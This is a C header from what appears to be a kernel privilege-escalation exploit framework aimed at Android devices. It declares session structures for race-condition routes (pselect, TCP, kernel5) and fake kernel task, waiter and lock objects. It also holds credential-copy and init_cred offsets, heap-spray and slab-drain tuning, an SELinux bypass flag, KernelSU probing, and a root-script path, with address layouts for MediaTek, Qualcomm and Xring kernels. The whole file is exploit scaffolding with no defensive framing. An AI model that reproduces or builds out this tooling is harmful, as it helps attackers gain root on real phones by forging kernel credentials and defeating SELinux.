#ifndef GLK_SESSION_H
#define GLK_SESSION_H

/*
 * TODO(temp-20261021): test branch accepts a single process-wide session,
 * the pure-C boundary, and the pselect leak-on-stuck exception. Re-check all
 * three at P6 before any production wiring.
 */

#include "common.h"

typedef struct Glk43499Session Glk43499Session;

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdatomic.h>
#include <pthread.h>
#include <time.h>

/** @brief Session creation result codes. */
typedef enum {
  GLK_OK = 0,
  GLK_BAD_PARAM = 2,
} GlkStatus;

/** @brief Backend tag stored in the process-wide handle. */
typedef enum {
  GLK_BACKEND_NONE = 0,
  GLK_BACKEND_43499 = 1,
  GLK_BACKEND_43284 = 2,
} GlkBackend;

/** @brief Route selection for one 43499 session. */
typedef enum {
  GLK_ROUTE_AUTO = 0,
  GLK_ROUTE_PSELECT = 1,
  GLK_ROUTE_TCP = 2,
  GLK_ROUTE_KERNEL5 = 3,
} GlkRoute;

/** @brief Per-kernel address and payload layout copied at create. */
typedef struct {
  uintptr_t kimage_text_base;
  uintptr_t mtk_vaddr_base;
  uintptr_t xring_kernel_phys_load;
  uintptr_t qc_gki_6_12_phys_load;
  uintptr_t p0_page_offset;
  uintptr_t p0_phys_offset;
  uintptr_t direct_map_base;
  uintptr_t direct_map_end;
  uintptr_t vmemmap_start;
  uintptr_t kernelsnitch_identity_start;
  uintptr_t kernelsnitch_identity_end;
  uintptr_t p0_kernel_phys_load;
  uintptr_t init_cred_image;
  uint32_t page_shift;
  uint64_t page_size;
  uint32_t lock_off;
  uint32_t w0_off;
  uint32_t fops_off;
  uint32_t right_off;
  uint32_t left_off;
  uint32_t fake_task_off;
  uint32_t cred_copy_off;
  uint32_t tcp_fake_task_off;
  uint32_t tcp_cred_copy_off;
  uint32_t skb_data_delta;
  uint32_t skb_frag_bias;
  uint32_t skb_tcp_bias;
  uint32_t fake_waiter_tree_prio_off;
  uint32_t fake_waiter_tree_deadline_off;
  uint32_t fake_waiter_pi_tree_entry_off;
  uint32_t fake_waiter_pi_tree_prio_off;
  uint32_t fake_waiter_pi_tree_deadline_off;
  uint32_t fake_waiter_task_off;
  uint32_t fake_waiter_lock_off;
  uint32_t fake_waiter_prio;
  uint32_t fake_waiter_wake_state_off;
  uint32_t fake_waiter_ww_ctx_off;
  uint32_t fake_task_usage_off;
  uint32_t fake_task_prio_off;
  uint32_t fake_task_normal_prio_off;
  uint32_t fake_task_task_group_off;
  uint32_t fake_task_pi_lock_off;
  uint32_t fake_task_pi_waiters_off;
  uint32_t fake_task_pi_top_task_off;
  uint32_t fake_task_pi_blocked_on_off;
  uint32_t fake_task_prio;
  uint32_t fake_task_uclamp_req_off;
  uint32_t fake_task_uclamp_off;
} Glk43499Layout;

static inline size_t glk43499_order3_size(size_t page_size, uint32_t mm_order) {
  return page_size << mm_order;
}

/**
 * @brief Target description for one 43499 session.
 *
 * @note This structure is self-referential: offsets.uname_r points at release.
 *       It must be initialized in place with glk43499_target_init() and must
 *       never be copied by value, memcpy'd, or returned by value.
 */
typedef struct Glk43499Target {
  uintptr_t self;
  struct kernel_offsets offsets;
  char release[192];
  Glk43499Layout layout;
} Glk43499Target;

/** @brief Immutable policy/tuning values copied at create. */
typedef struct Glk43499Config {
  uint32_t main_cpu;
  uint32_t consumer_cpu;
  GlkRoute route;
  uint32_t resident;
  uint32_t w1_attempts;
  uint32_t w1_kernel5_attempts;
  uint32_t w1_settle_us;
  uint32_t w1_scratch_repair_attempts;
  uint32_t w2_attempts;
  uint32_t w2_settle_us;
  uint32_t w3_chain_rounds;
  uint32_t w3_attempts;
  uint32_t w3_settle_us;
  uint32_t w3_backoff_us;
  uint32_t w3_dir_attempts;
  uint32_t retry_write_backoff_us;
  uint32_t retry_write_post_us;
  uint32_t ksu_poll_us;
  uint32_t ksu_log_wait_us;
  uint32_t ksu_module_poll_rounds;
  uint32_t ksu_log_poll_rounds;
  uint32_t enforce_poll_rounds;
  uint32_t slab_drain_us;
  uint32_t enforce_wait_us;
  uint32_t race_wait_seconds;
  uint32_t race_poll_us;
  uint32_t select_nfds;
  uint32_t select_timeout_us;
  uint32_t select_enter_delay_us;
  uint32_t select_fast_repair_us;
  uint32_t select_route_poll_us;
  uint32_t select_consumer_nice;
  uint32_t select_consumer_burst_calls;
  uint32_t select_consumer_max_calls;
  uint32_t select_consumer_settle_us;
  uint32_t pselect_drain_rounds;
  uint32_t consumer_retry_wait_us;
  uint32_t post_root_settle_sec;
  uint32_t tcp_attempts;
  uint32_t tcp_arm_seq;
  uint32_t tcp_post_hold;
  uint32_t tcp_punch_len;
  uint32_t heap_prepare_attempts;
  uint32_t heap_prepare_deadline_sec;
  uint32_t mm_order;
  uint32_t mm_partials;
  uint32_t skb_reclaim_sends;
  uint32_t kernelsnitch_collisions;
  uint32_t slab_drain_waves;
  uint32_t slab_drain_batch;
  uint32_t perf_sample_period;
  uint32_t perf_candidates;
  uint32_t page_attempts;
  uint32_t page_deadline_sec;
  uint32_t route_wait_seconds;
  uint32_t route_fast_wait_us;
  uint32_t perf_buffer_pages;
  uint32_t perf_spin;
  uint32_t log_level;
  bool vr_bypass;
  bool w1_only;
  bool resident_5x;
  bool phase1_probe;
  bool tcp_route;
  char home[256];
  char root_script[300];
  char ksu_log[320];
} Glk43499Config;

/** @brief Caller-probed environment facts. */
typedef struct {
  bool selinux_readable;
  bool selinux_permissive;
  bool has_seccomp;
  bool kernelsu_loaded;
  bool zygote;
  uint64_t direct_map_end;
} Glk43499Env;

#include "../../glk_log/glk_log.h"

/** @brief One 43499 write request. label is borrowed for the call only. */
typedef struct GlkWriteRequest {
  uintptr_t target;
  uintptr_t value;
  uint32_t mode;
  uint32_t preserve_child;
  const char *label;
} GlkWriteRequest;

/** @brief Borrowed arguments for the waiter thread (session + current write). */
typedef struct {
  struct Glk43499Session *s;
  const GlkWriteRequest *req;
} GlkRouteThreadArg;

/** @brief Live state formerly held in main.c/fops.c/util.c globals. */
typedef struct {
  uint32_t f_wait;
  uint32_t f_pi_target;
  uint32_t f_pi_chain;
  atomic_int waiter_ready;
  atomic_int waiter_waiting;
  atomic_int owner_started;
  atomic_int owner_chain_done;
  atomic_int owner_stop;
  atomic_int route_done;
  atomic_int waiter_tid;
  atomic_int punch_consume_go;
  atomic_int punch_consume_stop;
  atomic_int consumer_calls;
  atomic_int consumer_success;
  atomic_int consumer_inflight;
  atomic_int main_route_delay_usec;
  atomic_int fast_repair_route;
  pthread_t waiter_thread;
  pthread_t owner_thread;
  pthread_t consumer_thread;
  pthread_t mr_tx;
  pthread_t mr_ty;
  bool waiter_started;
  bool owner_started_flag;
  bool consumer_started;
  bool mr_started;
  uint32_t mr_l1;
  uint32_t mr_l2;
  uint32_t mr_cond;
  int mr_policy;
  int mr_lock_slot;
  uintptr_t mr_target;
  uintptr_t mr_value;
  uintptr_t mr_lock;
  uintptr_t mr_task;
  int mr_fd;
  int mr_ready;
  atomic_int mr_y_l2;
  atomic_int mr_x_l1;
  atomic_int mr_y_wait;
  atomic_int mr_x_wait;
  atomic_int mr_y_done;
  atomic_int mr_respray;
  atomic_int mr_sprayed;
  atomic_int mr_stop;
  atomic_int mr_x_done;
  atomic_int mr_y_tid;
  atomic_int tcp_punch_go;
  atomic_int tcp_punch_stop;
  atomic_int tcp_punch_phase;
  atomic_int tcp_punch_failed;
  int route_last_step;
  int route_last_errno;
  uintptr_t page_base;
  uintptr_t last_mm_struct;
  uintptr_t fake_lock;
  uintptr_t fake_w0;
  uintptr_t fake_task;
  uintptr_t fake_parent;
  uintptr_t fake_right;
  uintptr_t fake_left;
  uintptr_t fake_fops;
  uintptr_t prebuilt_page_base;
  uintptr_t prebuilt_fake_lock;
  uintptr_t prebuilt_fake_w0;
  uintptr_t prebuilt_fake_task;
  uintptr_t prebuilt_fake_parent;
  uintptr_t prebuilt_fake_right;
  uintptr_t prebuilt_fake_left;
  uintptr_t prebuilt_fake_fops;
  int reclaim_sv[2];
  int quarantined_reclaim_sv[2];
  int prebuilt_reclaim_sv[2];
  struct mm_ctx prepare_ctx;
  struct mm_ctx spray_ctx;
  struct mm_ctx pre_ctx;
  struct mm_ctx post_ctx;
  pid_t child_leak;
  int memfd_leak;
  int vr_needed;
  struct kernelsnitch_shared_state *ks;
  size_t mm_objs_per_slab;
  unsigned char *skb_buf;
  struct timespec t0;
} Glk43499Runtime;

/** @brief Last observed result of one session step. */
typedef struct {
  int status;
  int step;
  int errno_value;
  int consumer_calls;
  int consumer_success;
  uintptr_t page_base;
  uint32_t uid;
} Glk43499Result;

/** @brief One 43499 session; allocated by the caller and borrowed by GlkSession. */
struct Glk43499Session {
  Glk43499Target target;
  Glk43499Config config;
  Glk43499Env env;
  Glk43499Runtime rt;
  Glk43499Result result;
  GlkLogSink log;
  atomic_bool stopping;
};

/** @brief Caller-owned session handle; no process-wide instance. */
typedef struct {
  GlkBackend backend;
  union {
    struct Glk43499Session *p43499;
    void *p43284;
  } u;
} GlkSession;

/**
 * @brief Initialize a target in place and repoint offsets.uname_r at release.
 * @param dst Destination target; must remain at this address.
 * @param src Kernel offsets to copy.
 * @param release Kernel release string (copied).
 */
void glk43499_layout_defaults(Glk43499Layout *layout);
void glk43499_config_defaults(Glk43499Config *config);

void glk43499_target_init(Glk43499Target *dst,
                          const struct kernel_offsets *src,
                          const char *release);

/**
 * @brief Validate the self-reference installed by glk43499_target_init().
 * @param target Target to check.
 * @return 1 when target is in-place initialized, 0 otherwise.
 */
int glk43499_target_valid(const Glk43499Target *target);

/**
 * @brief Initialize one 43499 session handle.
 * @param outer Caller-owned outer handle.
 * @param inner Caller-owned inner session storage.
 * @param target In-place target description.
 * @param config Policy/tuning values.
 * @param env Caller-probed environment facts.
 * @return GLK_OK or GLK_BAD_PARAM. No process-wide pointer is written.
 */
int glk_session_create_43499(GlkSession *outer,
                             struct Glk43499Session *inner,
                             const Glk43499Target *target,
                             const Glk43499Config *config,
                             const Glk43499Env *env);

/**
 * @brief Clear one caller-owned session handle.
 * @param outer Caller-owned outer handle.
 * @note No process-wide pointer exists; the caller owns the handle lifetime.
 *       P1b/P1c/P1d add thread join and resource release in ownership order.
 */
void glk_session_destroy(GlkSession *outer);

#endif
